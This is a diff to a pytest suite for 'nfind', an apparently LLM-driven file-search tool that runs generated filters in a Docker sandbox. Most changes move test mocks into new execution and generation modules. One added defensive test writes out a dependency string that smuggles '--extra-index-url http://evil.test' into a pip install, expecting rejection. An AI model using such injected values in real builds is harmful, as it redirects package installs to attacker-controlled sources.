@@ -12,6 +12,8 @@ import pytest
 from fakes import FakeSandbox
 from nfind import backend as MODULE
 from nfind import cli, metadata, worker
+from nfind import execution as EXECUTION
+from nfind import generation as GENERATION
 
 
 def _gen(code, dependencies=()):
@@ -260,7 +262,7 @@ def test_worker_main_reports_nonzero_child_exit(monkeypatch):
 
 def test_run_filter_returns_normalized_results(tmp_path):
     fake = FakeSandbox(stdout=b'{"ok":true,"results":["/data/a"]}')
-    results = MODULE.run_filter("code", tmp_path, ["/data/a"], sandbox=fake)
+    results = EXECUTION.run_filter("code", tmp_path, ["/data/a"], sandbox=fake)
     assert results == [{"path": "/data/a"}]
     # The adapter builds the {code, paths, meta} request and mounts the root read-only.
     request, mounts, _ = fake.runs[0]
@@ -271,75 +273,75 @@ def test_run_filter_returns_normalized_results(tmp_path):
 @pytest.mark.parametrize("bad", [0, -1.5])
 def test_run_filter_rejects_nonpositive_limits(tmp_path, bad):
     with pytest.raises(ValueError):
-        MODULE.run_filter("code", tmp_path, [], sandbox=FakeSandbox(), timeout=bad)
+        EXECUTION.run_filter("code", tmp_path, [], sandbox=FakeSandbox(), timeout=bad)
 
 
 def test_run_filter_maps_timeout_to_timeouterror(tmp_path):
-    fake = FakeSandbox(run_error=MODULE.SandboxTimeout("boom"))
+    fake = FakeSandbox(run_error=EXECUTION.SandboxTimeout("boom"))
     with pytest.raises(TimeoutError, match="exceeded"):
-        MODULE.run_filter("code", tmp_path, [], sandbox=fake, timeout=10)
+        EXECUTION.run_filter("code", tmp_path, [], sandbox=fake, timeout=10)
 
 
 def test_run_filter_rejects_oversized_output(tmp_path):
-    fake = FakeSandbox(run_error=MODULE.SandboxOutputTooLarge("too big"))
+    fake = FakeSandbox(run_error=EXECUTION.SandboxOutputTooLarge("too big"))
     with pytest.raises(RuntimeError, match="exceeded the allowed size"):
-        MODULE.run_filter("code", tmp_path, [], sandbox=fake)
+        EXECUTION.run_filter("code", tmp_path, [], sandbox=fake)
 
 
 def test_run_filter_reports_nonzero_worker_exit(tmp_path):
     fake = FakeSandbox(stderr=b"boom", returncode=1)
     with pytest.raises(RuntimeError, match="Docker worker failed: boom"):
-        MODULE.run_filter("code", tmp_path, [], sandbox=fake)
+        EXECUTION.run_filter("code", tmp_path, [], sandbox=fake)
 
 
 def test_run_filter_rejects_invalid_json(tmp_path):
     fake = FakeSandbox(stdout=b"not json")
     with pytest.raises(RuntimeError, match="invalid response"):
-        MODULE.run_filter("code", tmp_path, [], sandbox=fake)
+        EXECUTION.run_filter("code", tmp_path, [], sandbox=fake)
 
 
 def test_run_filter_propagates_worker_error(tmp_path):
     fake = FakeSandbox(stdout=b'{"ok":false,"error":"nope"}')
     with pytest.raises(RuntimeError, match="Generated filter failed: nope"):
-        MODULE.run_filter("code", tmp_path, [], sandbox=fake)
+        EXECUTION.run_filter("code", tmp_path, [], sandbox=fake)
 
 
 def test_run_filter_rejects_disallowed_result_path(tmp_path):
     fake = FakeSandbox(stdout=b'{"ok":true,"results":["/evil"]}')
     with pytest.raises(RuntimeError, match="invalid result"):
-        MODULE.run_filter("code", tmp_path, ["/data/a"], sandbox=fake)
+        EXECUTION.run_filter("code", tmp_path, ["/data/a"], sandbox=fake)
 
 
 def test_run_filter_accepts_explicit_limits(tmp_path):
     fake = FakeSandbox(stdout=b'{"ok":true,"results":[]}')
-    limits = MODULE.Limits(memory="64m", cpus=2.0, pids=8, timeout=3.0, max_output_bytes=512)
-    MODULE.run_filter("code", tmp_path, [], sandbox=fake, limits=limits)
+    limits = EXECUTION.Limits(memory="64m", cpus=2.0, pids=8, timeout=3.0, max_output_bytes=512)
+    EXECUTION.run_filter("code", tmp_path, [], sandbox=fake, limits=limits)
     # The supplied Limits is passed straight through to the sandbox.
     assert fake.runs[0][2] is limits
 
 
 def test_run_filter_rejects_nonpositive_explicit_limits(tmp_path):
-    bad = MODULE.Limits(timeout=0)
+    bad = EXECUTION.Limits(timeout=0)
     with pytest.raises(ValueError):
-        MODULE.run_filter("code", tmp_path, [], sandbox=FakeSandbox(), limits=bad)
+        EXECUTION.run_filter("code", tmp_path, [], sandbox=FakeSandbox(), limits=bad)
 
 
 def test_build_worker_image_surfaces_package_names_on_build_failure():
-    fake = FakeSandbox(derive_error=MODULE.SandboxError("exit status 1"))
-    with pytest.raises(MODULE.DockerError, match=r"packages \(mutagen, rarfile\)"):
-        MODULE.build_worker_image("base:latest", ["rarfile", "mutagen"], sandbox=fake)
+    fake = FakeSandbox(derive_error=EXECUTION.SandboxError("exit status 1"))
+    with pytest.raises(EXECUTION.DockerError, match=r"packages \(mutagen, rarfile\)"):
+        EXECUTION.build_worker_image("base:latest", ["rarfile", "mutagen"], sandbox=fake)
 
 
 def test_search_maps_host_paths_in_records(tmp_path):
     (tmp_path / "file.txt").write_text("content")
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value=MODULE.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(
             MODULE, "generate_filter", return_value=_gen("def filter_paths(paths): return paths")
         ),
         patch.object(
-            MODULE,
+            EXECUTION,
             "run_filter",
             return_value=[{"path": "/data/file.txt", "lines": 1}],
         ),
@@ -354,11 +356,11 @@ def test_search_invokes_on_generated_before_running(tmp_path):
     seen: list[str] = []
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value=MODULE.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(
             MODULE, "generate_filter", return_value=_gen("def filter_paths(paths): return []")
         ),
-        patch.object(MODULE, "run_filter", return_value=[]) as run_filter,
+        patch.object(EXECUTION, "run_filter", return_value=[]) as run_filter,
     ):
         MODULE.search(str(tmp_path), "files", on_generated=seen.append, format_code=False)
 
@@ -374,11 +376,11 @@ def test_search_aborts_when_on_generated_raises(tmp_path):
 
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value=MODULE.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(
             MODULE, "generate_filter", return_value=_gen("def filter_paths(paths): return []")
         ),
-        patch.object(MODULE, "run_filter") as run_filter,
+        patch.object(EXECUTION, "run_filter") as run_filter,
         pytest.raises(RuntimeError, match="declined"),
     ):
         MODULE.search(str(tmp_path), "files", on_generated=decline)
@@ -390,13 +392,13 @@ def test_search_rejects_unapproved_dependencies(tmp_path):
     (tmp_path / "file.txt").write_text("content")
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image") as build,
+        patch.object(EXECUTION, "build_worker_image") as build,
         patch.object(
             MODULE,
             "generate_filter",
             return_value=_gen("def filter_paths(paths): return paths", ["sketchy-pkg"]),
         ),
-        patch.object(MODULE, "run_filter") as run_filter,
+        patch.object(EXECUTION, "run_filter") as run_filter,
         pytest.raises(MODULE.DependencyError, match="sketchy-pkg"),
     ):
         MODULE.search(str(tmp_path), "files", whitelist=set())
@@ -409,14 +411,14 @@ def test_search_uses_whitelisted_dependency_without_prompt(tmp_path):
     (tmp_path / "file.txt").write_text("content")
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value="img:deps") as build,
+        patch.object(EXECUTION, "build_worker_image", return_value="img:deps") as build,
         patch.object(
             MODULE,
             "generate_filter",
             return_value=_gen("def filter_paths(paths): return paths", ["mutagen"]),
         ),
-        patch.object(MODULE, "run_filter", return_value=[]) as run_filter,
-        patch.object(MODULE, "approve_packages") as persist,
+        patch.object(EXECUTION, "run_filter", return_value=[]) as run_filter,
+        patch.object(EXECUTION, "approve_packages") as persist,
     ):
         # "mutagen" is in the default whitelist, so no approver call is needed.
         MODULE.search(str(tmp_path), "files", approve_dependencies=lambda pkgs: False)
@@ -432,14 +434,14 @@ def test_search_approves_new_dependency_and_persists(tmp_path):
     asked: list[list[str]] = []
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value="img:deps") as build,
+        patch.object(EXECUTION, "build_worker_image", return_value="img:deps") as build,
         patch.object(
             MODULE,
             "generate_filter",
             return_value=_gen("def filter_paths(paths): return paths", ["rarfile"]),
         ),
-        patch.object(MODULE, "run_filter", return_value=[]),
-        patch.object(MODULE, "approve_packages") as persist,
+        patch.object(EXECUTION, "run_filter", return_value=[]),
+        patch.object(EXECUTION, "approve_packages") as persist,
     ):
 
         def approver(pkgs):
@@ -460,11 +462,11 @@ def test_cli_confirm_aborts_without_running(tmp_path):
     runner = CliRunner()
     with (
         patch.object(cli.backend, "check_docker_available"),
-        patch.object(cli.backend, "build_worker_image", return_value=cli.backend.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(
             cli.backend, "generate_filter", return_value=_gen("def filter_paths(paths): return []")
         ),
-        patch.object(cli.backend, "run_filter") as run_filter,
+        patch.object(EXECUTION, "run_filter") as run_filter,
     ):
         result = runner.invoke(cli.app, ["files", str(tmp_path), "--confirm"], input="n\n")
 
@@ -520,7 +522,7 @@ def test_check_undefined_names_allows_injected_meta_global():
 
 def test_check_undefined_names_fails_open_without_ruff():
     # No ruff -> the gate must not block generation on a tooling gap.
-    with patch.object(MODULE, "_ruff_path", return_value=None):
+    with patch.object(GENERATION, "_ruff_path", return_value=None):
         MODULE._check_undefined_names("def filter_paths(paths):\n    return os.listdir(paths)")
 
 
@@ -570,8 +572,8 @@ def test_search_uses_node_base_image_and_runtime(tmp_path):
             "generate_filter",
             return_value=_gen_node("function filterPaths(p){return p;}", ["ts-morph"]),
         ),
-        patch.object(MODULE, "build_worker_image", side_effect=fake_build),
-        patch.object(MODULE, "run_filter", return_value=[]) as run_filter,
+        patch.object(EXECUTION, "build_worker_image", side_effect=fake_build),
+        patch.object(EXECUTION, "run_filter", return_value=[]) as run_filter,
     ):
         MODULE.search(str(tmp_path), "typescript files")
 
@@ -691,43 +693,43 @@ def _fake_openai(*contents):
     responses = [Mock(choices=[Mock(message=Mock(content=content))]) for content in contents]
     client = Mock()
     client.chat.completions.create.side_effect = responses
-    return patch.object(MODULE, "_make_client", return_value=client), client
+    return patch.object(GENERATION, "_make_client", return_value=client), client
 
 
 def test_split_model_defaults_to_openai_for_bare_name():
-    assert MODULE._split_model("gpt-4o-mini") == ("openai", "gpt-4o-mini")
+    assert GENERATION._split_model("gpt-4o-mini") == ("openai", "gpt-4o-mini")
 
 
 def test_split_model_parses_provider_prefix():
-    assert MODULE._split_model("anthropic/claude-3-5-sonnet") == (
+    assert GENERATION._split_model("anthropic/claude-3-5-sonnet") == (
         "anthropic",
         "claude-3-5-sonnet",
     )
     # Only the first slash splits; vendor-qualified names pass through.
-    assert MODULE._split_model("openrouter/anthropic/claude-3") == (
+    assert GENERATION._split_model("openrouter/anthropic/claude-3") == (
         "openrouter",
         "anthropic/claude-3",
     )
     # Stray whitespace and an empty half fall back to the default provider.
-    assert MODULE._split_model("  groq/llama-3.3  ") == ("groq", "llama-3.3")
-    assert MODULE._split_model("/oops") == ("openai", "/oops")
+    assert GENERATION._split_model("  groq/llama-3.3  ") == ("groq", "llama-3.3")
+    assert GENERATION._split_model("/oops") == ("openai", "/oops")
 
 
 def test_make_client_unknown_provider_raises():
     with pytest.raises(ValueError, match="Unknown model provider"):
-        MODULE._make_client("nope")
+        GENERATION._make_client("nope")
 
 
 def test_make_client_missing_key_raises(monkeypatch):
     monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
     with pytest.raises(RuntimeError, match="ANTHROPIC_API_KEY"):
-        MODULE._make_client("anthropic")
+        GENERATION._make_client("anthropic")
 
 
 def test_make_client_uses_base_url_and_key(monkeypatch):
     monkeypatch.setenv("GROQ_API_KEY", "secret")
     with patch("openai.OpenAI") as ctor:
-        MODULE._make_client("groq")
+        GENERATION._make_client("groq")
     assert ctor.call_args.kwargs == {
         "base_url": "https://api.groq.com/openai/v1",
         "api_key": "secret",
@@ -737,7 +739,7 @@ def test_make_client_uses_base_url_and_key(monkeypatch):
 def test_make_client_local_provider_needs_no_key(monkeypatch):
     monkeypatch.delenv("OLLAMA_API_KEY", raising=False)
     with patch("openai.OpenAI") as ctor:
-        MODULE._make_client("ollama")
+        GENERATION._make_client("ollama")
     assert ctor.call_args.kwargs["base_url"] == "http://localhost:11434/v1"
     assert ctor.call_args.kwargs["api_key"]  # non-empty placeholder
 
@@ -752,7 +754,7 @@ def test_make_client_local_provider_needs_no_key(monkeypatch):
     ],
 )
 def test_extract_json_object_recovers_object(content):
-    assert json.loads(MODULE._extract_json_object(content)) == {"code": "x"}
+    assert json.loads(GENERATION._extract_json_object(content)) == {"code": "x"}
 
 
 def test_generate_filter_drops_json_mode_when_provider_rejects_it():
@@ -763,8 +765,8 @@ def test_generate_filter_drops_json_mode_when_provider_rejects_it():
         Exception("response_format not supported"),
         Mock(choices=[Mock(message=Mock(content=good))]),
     ]
-    with patch.object(MODULE, "_make_client", return_value=client):
-        result = MODULE.generate_filter("anything", model="groq/llama-3.3")
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        result = GENERATION.generate_filter("anything", model="groq/llama-3.3")
     assert result.code == "def filter_paths(paths): return paths"
     assert client.chat.completions.create.call_count == 2
     first, second = client.chat.completions.create.call_args_list
@@ -786,8 +788,8 @@ def test_generate_filter_renames_max_tokens_for_reasoning_models():
         ),
         _good_response(),
     ]
-    with patch.object(MODULE, "_make_client", return_value=client):
-        result = MODULE.generate_filter("anything", model="openai/o3")
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        result = GENERATION.generate_filter("anything", model="openai/o3")
     assert result.code
     last = client.chat.completions.create.call_args_list[-1].kwargs
     assert "max_completion_tokens" in last and "max_tokens" not in last
@@ -799,8 +801,8 @@ def test_generate_filter_drops_unsupported_temperature():
         Exception("Unsupported value: 'temperature' does not support 0; only the default (1)."),
         _good_response(),
     ]
-    with patch.object(MODULE, "_make_client", return_value=client):
-        MODULE.generate_filter("anything", model="o3")
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        GENERATION.generate_filter("anything", model="o3")
     assert "temperature" not in client.chat.completions.create.call_args_list[-1].kwargs
 
 
@@ -812,8 +814,8 @@ def test_generate_filter_learned_adaptation_persists_across_attempts():
         Mock(choices=[Mock(message=Mock(content="not json"))]),  # triggers a validation retry
         _good_response(),
     ]
-    with patch.object(MODULE, "_make_client", return_value=client):
-        MODULE.generate_filter("anything", model="o3", attempts=2)
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        GENERATION.generate_filter("anything", model="o3", attempts=2)
     assert client.chat.completions.create.call_count == 3
     # Every successful (non-error) call used the renamed parameter.
     for call in client.chat.completions.create.call_args_list[1:]:
@@ -829,10 +831,10 @@ def test_generate_filter_reports_unknown_model():
         "The model `gpt-5.0` does not exist or you do not have access to it."
     )
     with (
-        patch.object(MODULE, "_make_client", return_value=client),
+        patch.object(GENERATION, "_make_client", return_value=client),
         pytest.raises(RuntimeError, match="not found.*--list-models"),
     ):
-        MODULE.generate_filter("anything", model="openai/gpt-5.0")
+        GENERATION.generate_filter("anything", model="openai/gpt-5.0")
     # Reported immediately, without burning retries on a doomed id.
     assert client.chat.completions.create.call_count == 1
 
@@ -849,8 +851,8 @@ def test_generate_filter_falls_back_to_responses_api():
         "This model is only supported in v1/responses and not in v1/chat/completions."
     )
     client.responses.create.return_value = _good_responses_result()
-    with patch.object(MODULE, "_make_client", return_value=client):
-        result = MODULE.generate_filter("anything", model="openai/gpt-5.1-codex-mini")
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        result = GENERATION.generate_filter("anything", model="openai/gpt-5.1-codex-mini")
     assert result.code
     # Switched endpoints rather than reporting the model as missing.
     assert client.responses.create.call_count == 1
@@ -869,8 +871,8 @@ def test_generate_filter_responses_switch_persists_across_attempts():
         Mock(output_text="not json"),  # triggers a validation retry
         _good_responses_result(),
     ]
-    with patch.object(MODULE, "_make_client", return_value=client):
-        MODULE.generate_filter("anything", model="openai/gpt-5.1-codex-mini", attempts=2)
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        GENERATION.generate_filter("anything", model="openai/gpt-5.1-codex-mini", attempts=2)
     # Only the one probe that triggered the switch hit chat-completions.
     assert client.chat.completions.create.call_count == 1
     assert client.responses.create.call_count == 2
@@ -883,19 +885,19 @@ def test_generate_filter_caches_responses_verdict():
         "This model is only supported in v1/responses and not in v1/chat/completions."
     )
     client.responses.create.return_value = _good_responses_result()
-    with patch.object(MODULE, "_make_client", return_value=client):
-        MODULE.generate_filter("anything", model="openai/gpt-5.1-codex-mini")
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        GENERATION.generate_filter("anything", model="openai/gpt-5.1-codex-mini")
     # Cached under the full selector, not the bare model name.
-    assert MODULE.get_endpoint("openai/gpt-5.1-codex-mini") == "responses"
+    assert GENERATION.get_endpoint("openai/gpt-5.1-codex-mini") == "responses"
 
 
 def test_generate_filter_uses_cached_responses_verdict():
     # A cached verdict skips the throwaway chat-completions probe entirely.
-    MODULE.set_endpoint("openai/gpt-5.1-codex-mini", "responses")
+    GENERATION.set_endpoint("openai/gpt-5.1-codex-mini", "responses")
     client = Mock()
     client.responses.create.return_value = _good_responses_result()
-    with patch.object(MODULE, "_make_client", return_value=client):
-        result = MODULE.generate_filter("anything", model="openai/gpt-5.1-codex-mini")
+    with patch.object(GENERATION, "_make_client", return_value=client):
+        result = GENERATION.generate_filter("anything", model="openai/gpt-5.1-codex-mini")
     assert result.code
     client.chat.completions.create.assert_not_called()
     assert client.responses.create.call_count == 1
@@ -904,16 +906,16 @@ def test_generate_filter_uses_cached_responses_verdict():
 def test_list_models_returns_sorted_ids():
     client = Mock()
     client.models.list.return_value = Mock(data=[Mock(id="gpt-4o-mini"), Mock(id="gpt-4o")])
-    with patch.object(MODULE, "_make_client", return_value=client) as make:
-        assert MODULE.list_models("openai/whatever") == ["gpt-4o", "gpt-4o-mini"]
+    with patch.object(GENERATION, "_make_client", return_value=client) as make:
+        assert GENERATION.list_models("openai/whatever") == ["gpt-4o", "gpt-4o-mini"]
     assert make.call_args.args[0] == "openai"  # provider taken from the selector
 
 
 def test_list_models_uses_selected_provider():
     client = Mock()
     client.models.list.return_value = Mock(data=[])
-    with patch.object(MODULE, "_make_client", return_value=client) as make:
-        MODULE.list_models("groq/llama-3.3")
+    with patch.object(GENERATION, "_make_client", return_value=client) as make:
+        GENERATION.list_models("groq/llama-3.3")
     assert make.call_args.args[0] == "groq"
 
 
@@ -921,17 +923,17 @@ def test_list_models_reports_unsupported_listing():
     client = Mock()
     client.models.list.side_effect = Exception("listing not available")
     with (
-        patch.object(MODULE, "_make_client", return_value=client),
+        patch.object(GENERATION, "_make_client", return_value=client),
         pytest.raises(RuntimeError, match="Could not list models"),
     ):
-        MODULE.list_models("groq/x")
+        GENERATION.list_models("groq/x")
 
 
 def test_generate_filter_succeeds_on_first_attempt():
     good = json.dumps({"code": "def filter_paths(paths): return paths"})
     patcher, client = _fake_openai(good)
     with patcher:
-        result = MODULE.generate_filter("anything")
+        result = GENERATION.generate_filter("anything")
     assert result.code == "def filter_paths(paths): return paths"
     assert client.chat.completions.create.call_count == 1
 
@@ -941,7 +943,7 @@ def test_generate_filter_retries_on_invalid_then_succeeds():
     patcher, client = _fake_openai("not json", good)
     retries = []
     with patcher:
-        result = MODULE.generate_filter("anything", on_retry=lambda n, exc: retries.append(n))
+        result = GENERATION.generate_filter("anything", on_retry=lambda n, exc: retries.append(n))
     assert result.code == "def filter_paths(paths): return paths"
     assert client.chat.completions.create.call_count == 2
     assert retries == [1]
@@ -951,7 +953,7 @@ def test_generate_filter_retries_on_invalid_then_succeeds():
     assert messages[-2]["role"] == "assistant" and messages[-2]["content"] == "not json"
     assert messages[-1]["role"] == "user"
     # Retries leave temperature 0 behind so the model diverges.
-    assert second_call.kwargs["temperature"] == MODULE._RETRY_TEMPERATURE
+    assert second_call.kwargs["temperature"] == GENERATION._RETRY_TEMPERATURE
 
 
 def test_generate_filter_retries_on_undefined_name_then_succeeds():
@@ -961,7 +963,7 @@ def test_generate_filter_retries_on_undefined_name_then_succeeds():
     patcher, client = _fake_openai(bad, good)
     retries = []
     with patcher:
-        result = MODULE.generate_filter("anything", on_retry=lambda n, exc: retries.append(exc))
+        result = GENERATION.generate_filter("anything", on_retry=lambda n, exc: retries.append(exc))
     assert "import os" in result.code
     assert client.chat.completions.create.call_count == 2
     assert retries and "undefined name" in str(retries[0])
@@ -970,13 +972,13 @@ def test_generate_filter_retries_on_undefined_name_then_succeeds():
 def test_generate_filter_raises_after_exhausting_attempts():
     patcher, client = _fake_openai("not json", "still not json")
     with patcher, pytest.raises(ValueError, match="after 2 attempt"):
-        MODULE.generate_filter("anything", attempts=2)
+        GENERATION.generate_filter("anything", attempts=2)
     assert client.chat.completions.create.call_count == 2
 
 
 def test_generate_filter_rejects_nonpositive_attempts():
     with pytest.raises(ValueError, match="attempts must be at least 1"):
-        MODULE.generate_filter("anything", attempts=0)
+        GENERATION.generate_filter("anything", attempts=0)
 
 
 def test_generate_filter_appends_macos_meta_guidance_only_when_enabled():
@@ -984,19 +986,19 @@ def test_generate_filter_appends_macos_meta_guidance_only_when_enabled():
 
     patcher, client = _fake_openai(good)
     with patcher:
-        MODULE.generate_filter("anything", macos_meta=True)
+        GENERATION.generate_filter("anything", macos_meta=True)
     system = client.chat.completions.create.call_args.kwargs["messages"][0]["content"]
     assert "META" in system and "quarantined" in system
 
     patcher, client = _fake_openai(good)
     with patcher:
-        MODULE.generate_filter("anything")
+        GENERATION.generate_filter("anything")
     system = client.chat.completions.create.call_args.kwargs["messages"][0]["content"]
     assert "META" not in system
 
 
 def test_collect_macos_metadata_empty_off_darwin(monkeypatch):
-    monkeypatch.setattr(MODULE.sys, "platform", "linux")
+    monkeypatch.setattr(metadata.sys, "platform", "linux")
     assert MODULE.collect_macos_metadata({"/data/a": "/host/a"}) == {}
 
 
@@ -1068,9 +1070,9 @@ def test_build_worker_image_derived_dockerfile_is_order_independent():
     # The derived image is content-addressed on the Dockerfile text, and packages are
     # sorted before the Dockerfile is rendered, so dependency order does not matter.
     first = FakeSandbox()
-    MODULE.build_worker_image("base:latest", ["a", "b"], sandbox=first)
+    EXECUTION.build_worker_image("base:latest", ["a", "b"], sandbox=first)
     second = FakeSandbox()
-    MODULE.build_worker_image("base:latest", ["b", "a"], sandbox=second)
+    EXECUTION.build_worker_image("base:latest", ["b", "a"], sandbox=second)
     assert first.derive_calls == second.derive_calls
 
 
@@ -1092,14 +1094,14 @@ def test_kotlin_swift_dart_grammars_are_pre_approved():
 
 def test_build_worker_image_returns_base_when_no_dependencies():
     fake = FakeSandbox()
-    assert MODULE.build_worker_image("base:latest", sandbox=fake) == "base:latest"
+    assert EXECUTION.build_worker_image("base:latest", sandbox=fake) == "base:latest"
     assert fake.ensure_calls == [False]
     assert fake.derive_calls == []
 
 
 def test_build_worker_image_builds_derived_for_dependencies():
     fake = FakeSandbox(derived="base:deps-abc123")
-    tag = MODULE.build_worker_image("base:latest", ["mutagen"], sandbox=fake)
+    tag = EXECUTION.build_worker_image("base:latest", ["mutagen"], sandbox=fake)
 
     assert tag == "base:deps-abc123"
     assert fake.ensure_calls == [False]
@@ -1119,8 +1121,8 @@ def test_cli_no_deps_rejects_packages(tmp_path):
             "generate_filter",
             return_value=_gen("def filter_paths(paths): return paths", ["rarfile"]),
         ),
-        patch.object(cli.backend, "build_worker_image") as build,
-        patch.object(cli.backend, "load_whitelist", return_value=set()),
+        patch.object(EXECUTION, "build_worker_image") as build,
+        patch.object(EXECUTION, "load_whitelist", return_value=set()),
     ):
         result = runner.invoke(cli.app, ["files", str(tmp_path), "--no-deps"])
 
@@ -1141,10 +1143,10 @@ def test_cli_yes_approves_packages(tmp_path):
             "generate_filter",
             return_value=_gen("def filter_paths(paths): return paths", ["rarfile"]),
         ),
-        patch.object(cli.backend, "build_worker_image", return_value="img:deps"),
-        patch.object(cli.backend, "run_filter", return_value=[]),
-        patch.object(cli.backend, "load_whitelist", return_value=set()),
-        patch.object(cli.backend, "approve_packages") as persist,
+        patch.object(EXECUTION, "build_worker_image", return_value="img:deps"),
+        patch.object(EXECUTION, "run_filter", return_value=[]),
+        patch.object(EXECUTION, "load_whitelist", return_value=set()),
+        patch.object(EXECUTION, "approve_packages") as persist,
     ):
         result = runner.invoke(cli.app, ["files", str(tmp_path), "--yes"])
 
@@ -1180,11 +1182,11 @@ def test_cli_save_writes_generated_code(tmp_path):
     runner = CliRunner()
     with (
         patch.object(cli.backend, "check_docker_available"),
-        patch.object(cli.backend, "build_worker_image", return_value=cli.backend.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(
             cli.backend, "generate_filter", return_value=_gen("def filter_paths(paths): return []")
         ),
-        patch.object(cli.backend, "run_filter", return_value=[]),
+        patch.object(EXECUTION, "run_filter", return_value=[]),
     ):
         result = runner.invoke(cli.app, ["files", str(tmp_path), "--save", str(out)])
 
@@ -1310,7 +1312,7 @@ def test_format_generated_code_leaves_node_unchanged():
 
 def test_format_generated_code_falls_back_when_ruff_missing():
     code = "def filter_paths(paths):\n    import os\n    return paths\n"
-    with patch.object(MODULE, "_ruff_path", return_value=None):
+    with patch.object(GENERATION, "_ruff_path", return_value=None):
         assert MODULE._format_generated_code(code, "python") == code
 
 
@@ -1319,9 +1321,9 @@ def test_search_formats_generated_code_before_running(tmp_path):
     messy = "def filter_paths(paths):\n    import os\n    return paths\n"
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value=MODULE.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(MODULE, "generate_filter", return_value=_gen(messy)),
-        patch.object(MODULE, "run_filter", return_value=[]) as run_filter,
+        patch.object(EXECUTION, "run_filter", return_value=[]) as run_filter,
     ):
         MODULE.search(str(tmp_path), "files")
 
@@ -1334,9 +1336,9 @@ def test_search_skips_formatting_when_disabled(tmp_path):
     messy = "def filter_paths(paths):\n    import os\n    return paths\n"
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value=MODULE.DEFAULT_IMAGE),
+        patch.object(EXECUTION, "build_worker_image", return_value=EXECUTION.DEFAULT_IMAGE),
         patch.object(MODULE, "generate_filter", return_value=_gen(messy)),
-        patch.object(MODULE, "run_filter", return_value=[]) as run_filter,
+        patch.object(EXECUTION, "run_filter", return_value=[]) as run_filter,
     ):
         MODULE.search(str(tmp_path), "files", format_code=False)
 
@@ -1386,6 +1388,7 @@ def test_serialize_filter_node_has_comment_header_and_raw_code():
 
     assert src.startswith("// nfind filter")
     assert "// Prompt:  TS files" in src
+    assert '// nfind-metadata: {"runtime":"node","dependencies":["ts-morph"]}' in src
     assert "python-only" in src
     assert code in src
     assert "# /// script" not in src  # no PEP 723 block for node
@@ -1425,6 +1428,48 @@ def test_deserialize_filter_detects_node_by_extension():
     assert parsed.runtime == "node"
 
 
+def test_deserialize_filter_round_trips_node_dependencies():
+    src = MODULE.serialize_filter(
+        _gen_node("function filterPaths(paths){return paths;}", ["ts-morph", "@babel/parser"]),
+        "ts",
+        "gpt-4o-mini",
+    )
+    parsed = MODULE.deserialize_filter(src, filename="filter.cjs")
+    assert parsed.runtime == "node"
+    assert parsed.dependencies == ["@babel/parser", "ts-morph"]
+
+
+def test_deserialize_filter_accepts_legacy_node_without_metadata():
+    src = "// nfind filter\n// Runtime: node\n\nfunction filterPaths(paths){return paths;}\n"
+    parsed = MODULE.deserialize_filter(src, filename="filter.cjs")
+    assert parsed.runtime == "node"
+    assert parsed.dependencies == []
+
+
+def test_deserialize_filter_rejects_invalid_node_metadata():
+    src = (
+        '// nfind-metadata: {"runtime":"node","dependencies":["not a package"]}\n'
+        "function filterPaths(paths){return paths;}\n"
+    )
+    with pytest.raises(ValueError, match="Invalid package name"):
+        MODULE.deserialize_filter(src, filename="filter.cjs")
+
+
+def test_deserialize_filter_rejects_invalid_python_dependencies():
+    # A crafted saved file must not smuggle pip arguments through the PEP 723 block into
+    # the image-build `pip install` line; validation rejects non-package-name strings.
+    src = (
+        "# /// script\n"
+        '# requires-python = ">=3.12"\n'
+        '# dependencies = ["requests==2.0 --extra-index-url http://evil.test"]\n'
+        "# ///\n"
+        '"""x"""\n\n\n'
+        "def filter_paths(paths):\n    return paths\n"
+    )
+    with pytest.raises(ValueError, match="Invalid package name"):
+        MODULE.deserialize_filter(src, filename="evil.py")
+
+
 def test_run_saved_replays_without_generating(tmp_path):
     (tmp_path / "a.mp3").write_text("x")
     code = 'def filter_paths(paths):\n    return [p for p in paths if p.endswith(".mp3")]'
@@ -1434,9 +1479,9 @@ def test_run_saved_replays_without_generating(tmp_path):
     container = "/data/a.mp3"
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image", return_value="img:deps"),
+        patch.object(EXECUTION, "build_worker_image", return_value="img:deps"),
         patch.object(MODULE, "generate_filter") as generate,
-        patch.object(MODULE, "run_filter", return_value=[{"path": container}]) as run_filter,
+        patch.object(EXECUTION, "run_filter", return_value=[{"path": container}]) as run_filter,
         patch.object(
             MODULE,
             "enumerate_paths",
@@ -1458,10 +1503,29 @@ def test_run_saved_gates_unapproved_dependencies(tmp_path):
     container = "/data/a"
     with (
         patch.object(MODULE, "check_docker_available"),
-        patch.object(MODULE, "build_worker_image") as build,
-        patch.object(MODULE, "run_filter") as run_filter,
